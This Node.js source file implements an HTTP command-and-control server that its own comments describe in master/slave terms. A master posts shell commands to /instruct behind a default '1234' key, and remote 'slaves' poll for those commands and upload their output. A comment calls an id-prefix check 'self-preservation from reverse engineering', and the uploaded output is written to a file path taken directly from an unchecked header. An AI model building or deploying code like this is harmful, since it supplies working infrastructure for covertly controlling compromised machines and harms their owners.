const http = require('http');
const PORT = process.env.PORT|| 14123;
const system = require('child_process')
const fs = require('fs')

let inp = "echo Hey\n"
let auth_key = process.env.auth || "1234"

const reset = () => {
    inp = ""
}

const auth = (req, res) => {
    if (req.headers.auth !== auth_key) {
        res.writeHead(401, { 'Content-Type': 'text/plain' });
        res.end("Unauthorized");
        return false
    }
    return true
}

const server = http.createServer((req, res) => {
    //basic slave route
    console.log(req.method)
    if (req.url === '/' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end(inp);
    }
    //slave callback route
    else if (req.url === '/' && req.method === 'POST') {
        if (!req.headers.id) {
            req.end("No id provided")
            return
        }
        else if (!req.headers.id.startsWith('sts')) { //tiny self-preservation from reverse engineering
            console.log(req.headers.id)
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end("ok")
            return
        }

        let buffer = ''
        req.on('data', c => buffer += c)
        req.on('end', () => {
            fs.writeFileSync(`./${req.headers.id}`, buffer)
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end("ok");
        })
    }

    //master status route
    else if (req.url === '/status' && req.method === 'GET') {
        if (auth(req, res)) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(inp);
        }
    }
    //master instruct route 
    else if (req.url === '/instruct' && req.method === 'POST') {
        if (auth(req, res)) {
            reset()
            req.on('data', c => inp += c)
            req.on('end', () => {
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end("Your wish is my command");
            })
        }
    }
});

server.listen(PORT, () => {
    console.log(`Shell server running @${PORT}`);
});
